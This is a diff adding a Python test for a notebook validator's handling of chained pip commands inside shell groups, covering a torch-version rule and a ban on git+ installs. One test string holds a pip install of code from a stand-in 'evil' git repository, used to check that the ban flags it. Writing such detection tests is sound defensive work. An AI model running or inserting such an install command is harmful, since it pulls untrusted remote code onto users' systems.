@@ -900,6 +900,35 @@ def test_only_the_git_ban_reads_conditional_invocations():
     ), "only unconditional_pip_invocations itself and R-INST-001 may read the raw iterator"
 
 
+def test_notebook_validator_keeps_a_group_conditional_throughout():
+    """An `&&` or `;` inside a `(` or `{` group belongs to the group, so it does not end the
+    fallback: if the left side succeeded, nothing in the group runs."""
+    nv = _load_notebook_validator_module()
+
+    for grouped in (
+        '!pip install foo || (pip install bar && pip install "torch==2.12.0")',
+        '!pip install foo || (pip install bar ; pip install "torch==2.12.0")',
+    ):
+        assert [flag for _, flag in nv._split_chained(grouped)] == [False, True, True], grouped
+        assert nv.rule_inst_004_torchcodec_torch(
+            grouped, COLAB_TORCH211, "nb.ipynb", 0
+        ) == [], grouped
+
+    # Outside a group, and after one closes, the operator still ends the tail.
+    for ungrouped in (
+        '!pip install foo || pip install bar && pip install "torch==2.12.0"',
+        '!pip install foo || (pip install bar) && pip install "torch==2.12.0"',
+    ):
+        assert [flag for _, flag in nv._split_chained(ungrouped)] == [False, True, False], ungrouped
+        assert len(
+            nv.rule_inst_004_torchcodec_torch(ungrouped, COLAB_TORCH211, "nb.ipynb", 0)
+        ) == 1, ungrouped
+
+    # The git+ ban still sees inside the group, conditional or not.
+    evil = "!pip install foo || (pip install bar && pip install git+https://example.com/evil.git)"
+    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0))
+
+
 def test_notebook_validator_reads_a_range_as_one_window():
     """A `>=X,<Y` pair is the same constraint as `~=X`, and the guard's own remedy is
     spelled that way (`pip install 'torchcodec>=0.11,<0.12.0'`), so the rule has to read it
